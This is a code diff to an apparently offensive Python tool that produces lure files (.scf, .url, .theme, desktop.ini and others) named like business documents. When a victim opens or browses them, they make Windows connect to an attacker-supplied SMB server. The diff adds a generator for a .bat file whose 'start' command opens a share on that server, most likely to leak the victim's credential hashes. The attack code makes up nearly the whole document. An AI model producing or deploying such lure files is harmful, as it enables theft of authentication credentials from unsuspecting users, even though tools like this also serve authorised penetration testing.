@@ -9,7 +9,7 @@ from __future__ import print_function
 # Open file and allow: pdf
 # Browser download and open: .application (Must be downloaded via a web browser and run)
 # Partial Open file: .m3u (Works if you open with windows media player, but windows 10 auto opens with groove music)
-
+# 
 # In progress - desktop.ini (Need to test older windows versions), autorun.ini (Need to test before windows 7), scf (Need to test on older windows)
 
 
@@ -67,6 +67,7 @@ parser.add_argument('-g', '--generate',
 		"zoom",
 		"libraryms",
 		"autoruninf",
+		"bat",
 		"desktopini")),
     help='Choose to generate all files or a specific filetype')
 parser.add_argument('-s', '--server',action='store', dest='server',required=True,
@@ -74,7 +75,6 @@ parser.add_argument('-s', '--server',action='store', dest='server',required=True
 parser.add_argument('-f', '--filename',action='store', dest='filename',required=True,
     help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
 args = parser.parse_args()
-
 
 # NOT WORKING ON LATEST WINDOWS
 # .scf remote IconFile Attack
@@ -100,6 +100,14 @@ URL=file://''' + server + '''/leak/leak.html''')
 	file.close()
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
+## .bat remote url attack
+def create_bat(generate, server, filename):
+    with open(filename, 'w') as file:
+        file.write(
+            f'@echo off\n'
+            f'start "" "\\\\{server}\\share"\n'
+        )
+    print("Created: " + filename + " (BROWSE TO FOLDER)")
 
 # .url remote IconFile attack
 # Filename: shareattack.url, action=browse, attacks=explorer
@@ -604,6 +612,8 @@ if (args.generate == "all" or args.generate == "modern"):
 
 	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
 
+	create_bat(args.generate, args.server, os.path.join(args.filename, args.filename + ".bat"))
+
 elif(args.generate == "scf"):
 	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
 
@@ -664,5 +674,8 @@ elif(args.generate == "desktopini"):
 
 elif(args.generate == "theme"):
 	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+
+elif(args.generate == "bat"):
+	create_bat(args.generate, args.server, os.path.join(args.filename, args.filename + ".bat"))
 
 print("Generation Complete.")
